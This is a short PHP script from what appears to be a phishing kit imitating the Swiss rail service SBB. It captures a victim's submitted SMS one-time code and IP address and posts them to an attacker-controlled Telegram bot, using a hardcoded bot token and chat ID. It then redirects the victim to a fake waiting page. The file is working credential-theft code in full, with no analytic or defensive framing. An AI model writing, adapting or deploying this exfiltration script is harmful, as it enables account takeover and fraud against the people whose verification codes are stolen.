<?php
$sms = $_POST['token'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 

 
$subject = "SMS | :   :) <3 : from: ".$ip;
$nome="SBB SMS " ; 
	$from="frt@huzrt.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ 😈 LX TAKE GIFT 😈 +-----------------\r\n";
$message .= "SMS : ".$sms."\r\n";
$message .= "---------------+ IP VICTIME +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ ⚡️  SMS DONE ⚡️  +------------------\r\n";



 	$website="https://api.telegram.org/bot5190378675:AAFJaF20VJQLllVHWJUAZzRU4SkT8MMy_Vc";
    $params=[
        'chat_id'=>'2142292088',
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 


   $x=md5(microtime());$xx=sha1(microtime());


echo "<script> window.top.location.href = '../wait/index.html?cmd=_sbb&session=".$x.$xx."';   </script>";

?>